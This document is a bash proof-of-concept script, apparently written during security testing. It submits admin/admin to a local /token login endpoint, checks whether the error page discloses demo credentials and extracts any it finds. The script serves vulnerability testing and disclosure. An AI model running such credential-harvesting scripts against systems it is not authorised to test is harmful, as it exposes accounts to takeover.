#!/bin/bash

# POC: Information Disclosure - Demo Credentials Exposed in Login Error Page
# This script demonstrates that demo credentials are exposed in plain text
# when incorrect credentials are submitted to the /token endpoint

TARGET_URL="http://localhost:8080/token"
INVALID_USERNAME="admin"
INVALID_PASSWORD="admin"

echo "[*] Testing for demo credentials disclosure vulnerability"
echo "[*] Target: $TARGET_URL"
echo "[*] Submitting invalid credentials to trigger error response..."
echo ""

# Send invalid credentials to the login endpoint
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -d "username=$INVALID_USERNAME&password=$INVALID_PASSWORD" \
  -H "Content-Type: application/x-www-form-urlencoded")

echo "[*] Response received:"
echo "$RESPONSE"
echo ""

# Check if demo credentials are present in the response
if echo "$RESPONSE" | grep -q "demo"; then
  echo "[!] VULNERABILITY CONFIRMED: Demo credentials found in response!"
  echo ""
  
  # Extract and display the demo credentials
  if echo "$RESPONSE" | grep -q "Username.*demo"; then
    echo "[+] Extracted Demo Credentials:"
    echo "$RESPONSE" | grep -oP '(?<=<strong>Username:</strong>)\s*\K[^<]+|(?<=<strong>Password:</strong>)\s*\K[^<]+' | while read -r cred; do
      echo "    - $cred"
    done
  fi
  
  exit 0
else
  echo "[!] Demo credentials NOT found in response"
  exit 1
fi